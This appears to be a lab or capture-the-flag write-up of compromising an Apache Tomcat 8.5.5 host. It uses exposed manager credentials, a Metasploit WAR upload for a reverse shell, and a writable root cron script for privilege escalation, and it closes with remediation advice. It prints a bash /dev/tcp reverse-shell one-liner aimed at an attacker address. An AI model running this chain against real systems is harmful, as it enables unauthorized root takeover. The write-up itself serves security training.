

# Executive Summary

The target system was found to be running an Apache Tomcat service with exposed management functionality and multiple misconfigurations. Initial access was achieved through exposed credentials discovered on the web interface, leading to remote code execution and a low-privileged shell. Privilege escalation was subsequently obtained via a misconfigured cron job that executed a writable script as root.
# Reconnaissance & Enumeration
## Nmap 

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.13 (96%), Linux 4.4 (96%), Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%), Android 7.1.1 - 7.1.2 (92%), Android 8 (Linux 3.10) (92%)
No exact OS matches for host (test conditions non-ideal).
```

#### Port 8009:
- Apache Jserv Protocol 1.3 was exposed on its default port.
- This service can allow backend communication between Apache and Tomcat.
- The system is potentially vulnerable to **Ghostcat (CVE-2020-1938)**, which can allow unauthorized file disclosure and in some cases, remote code execution.

A `ghostcat` exploit was successfully performed, but no meaningful sensitive file retrieval was achieved in this instance.

#### Port 8080:
- The default Apache Tomcat landing page was accessible.
- Further inspection using intercepting proxy tools (Burp Suite Repeater) revealed exposed credentials:

![[thompson_1.png]]

`tomcat:s3cret`

- These credentials granted access to the Tomcat Manager interface.

# Exploitation

Using the recovered credentials, access to the Tomcat Manager Dashboard was obtained. 
The authenticated Tomcat Manager was exploited with a Metasploit module:
- `multi/http/tomcat_mgr_upload`

This module allowed deployment of a malicious WAR file, resulting in a reverse shell on the target system.

![[thompson_2.png]]

The first flag can be found in `/home/jack/user.txt` 

# Post-Exploitation & Privilege Escalation 

System enumeration revealed a script that is world-writable and is executed by root every minute. The script (`id.sh`) was writable by any user. This was exploited by overwriting it with a reverse-shell payload:
```
echo bash -i >& /dev/tcp/10.0.0.1/1234 0>&1 > id.sh
```

A listener was configured on the attacking machine before overwriting the script, and a reverse shell with root privileges was obtained upon cron execution. This resulted in achieving full system compromise.

# Impact Summary

The target system was fully compromised, resulting in complete loss of confidentiality, integrity, and availability. Initial access was achieved through exposed credentials associated with the Apache Tomcat Manager interface, which was accessible due to insecure configuration. This allowed authenticated remote code execution on the host.

Further risk was introduced by an exposed Apache JServ Protocol (AJP) service on port 8009, which may be susceptible to known vulnerabilities such as Ghostcat (CVE-2020-1938), increasing the attack surface of the Tomcat deployment.

Privilege escalation was ultimately achieved through a critical misconfiguration in system scheduling. A root-level cron job executed a script located in a user-writable directory (`/home/jack/id.sh`). Because this script was world-writable and executed with root privileges, it enabled straightforward escalation to full administrative control of the system.

As a result, the attacker obtained complete control over the host, including the ability to execute arbitrary commands as root, access sensitive data, and potentially persist access. Immediate remediation is required, including securing Tomcat Manager access, disabling or restricting AJP exposure, and correcting unsafe file permissions and cron job configurations.

